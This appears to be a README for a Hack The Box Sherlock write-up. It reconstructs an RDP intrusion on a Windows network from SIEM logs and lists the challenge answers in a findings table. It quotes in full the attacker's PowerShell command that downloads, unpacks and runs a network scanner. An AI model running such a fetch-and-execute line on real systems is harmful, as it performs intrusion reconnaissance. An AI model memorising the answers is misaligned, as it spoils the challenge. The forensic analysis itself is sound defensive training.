# TaskForce

## Overview

**TaskForce** is a Windows SIEM threat-hunting Sherlock focused on reconstructing an intrusion from incomplete and inconsistently configured telemetry.

The investigation starts from a persistence hypothesis involving a suspicious scheduled task and expands into process execution, Microsoft Defender tampering, PowerShell-based reconnaissance, RDP lateral movement, and reconstruction of a malicious interactive session despite missing successful-logon events.

The most useful data sources were:

- Microsoft-Windows-Sysmon
- Windows Security
- PowerShell Operational
- PowerShell classic logs
- Microsoft Defender Operational
- Task Scheduler Operational
- Windows Application logs

The case is a good example of why a single event source is rarely enough. Several expected authentication events were unavailable, so the attack path had to be reconstructed through process, network, registry, and session artifacts.

---

## High-level attack sequence

1. A legitimate scheduled task named SQLConnectivityCheck existed in the environment as part of the administrative baseline.
2. A look-alike task named SQLConnectvityCheck appeared later, using a typo to blend in.
3. The attacker established an RDP session on ALLIANCE-WS07.
4. Sysmon recorded the inbound RDP connection from 192.168.72.131 to 192.168.72.101:3389.
5. Registry telemetry for the new session showed:
   - SESSIONNAME = RDP-Tcp#0
   - CLIENTNAME = kali
6. The compromised account was ALLIANCE\john.shepard.
7. The malicious session was associated with:
   - Logon ID 0x7B9417
   - Terminal Session ID 2
8. The attacker used PowerShell to download, extract, and execute SoftPerfect Network Scanner.
9. netscan.exe performed internal-network reconnaissance.
10. Microsoft Defender later recorded an exclusion for SQLBackup.exe.
11. C:\Users\Public\Pictures\SQLBackup.exe executed on ALLIANCE-CENTRAL, spawned a child copy, and crashed.
12. Task Scheduler later recorded the suspicious typo task SQLConnectvityCheck.

---

## Key findings

| Finding | Value |
|---|---|
| Suspicious scheduled task | SQLConnectvityCheck |
| Legitimate baseline task | SQLConnectivityCheck |
| Suspicious executable | SQLBackup.exe |
| Executable path | C:\Users\Public\Pictures\SQLBackup.exe |
| First malicious login | **2026-06-09 12:41:09 UTC** |
| Compromised account | ALLIANCE\john.shepard |
| Malicious Logon ID | 0x7B9417 |
| Terminal Session ID | 2 |
| RDP source IP | 192.168.72.131 |
| RDP destination | ALLIANCE-WS07 / 192.168.72.101:3389 |
| RDP client hostname | kali |
| Reconnaissance utility | SoftPerfect Network Scanner |
| Recon executable | netscan.exe |
| Defender exclusion | SQLBackup.exe |

---

## Reconnaissance command

PowerShell Script Block Logging preserved the complete command used to download, extract, and execute SoftPerfect Network Scanner:

~~~powershell
$url = "https://www.softperfect.com/download/files/netscan_portable.zip"; $out = "C:\Users\Public\netscan_portable.zip"; Invoke-WebRequest -Uri $url -OutFile $out; Expand-Archive $out -DestinationPath "C:\Users\Public\SoftPerfect"; & "C:\Users\Public\SoftPerfect\x86_64\netscan.exe"
~~~

This activity occurred inside the malicious john.shepard session.

---

## Why the session reconstruction mattered

The expected successful-logon event was not available for the malicious session on ALLIANCE-WS07.

The investigation therefore pivoted through:

~~~text
netscan.exe
  |
  +--> LogonId 0x7B9417
         |
         +--> TerminalSessionId 2
                |
                +--> inbound TCP/3389 from 192.168.72.131
                |
                +--> rdpclip.exe
                |
                +--> HKU\...\Volatile Environment\2
                       |
                       +--> SESSIONNAME = RDP-Tcp#0
                       +--> CLIENTNAME = kali
~~~

This provided a complete RDP attribution path without relying on Security Event 4624.

---

## Repository contents

- [Timeline](./timeline.md)
- [Findings and challenge answers](./findings.md)
- [Investigation notes](./investigation-notes.md)

---

## Scope note

This write-up documents the evidence observed in the provided Hack The Box SIEM environment. Where expected telemetry was missing, conclusions are based only on corroborating artifacts that were present in the dataset.
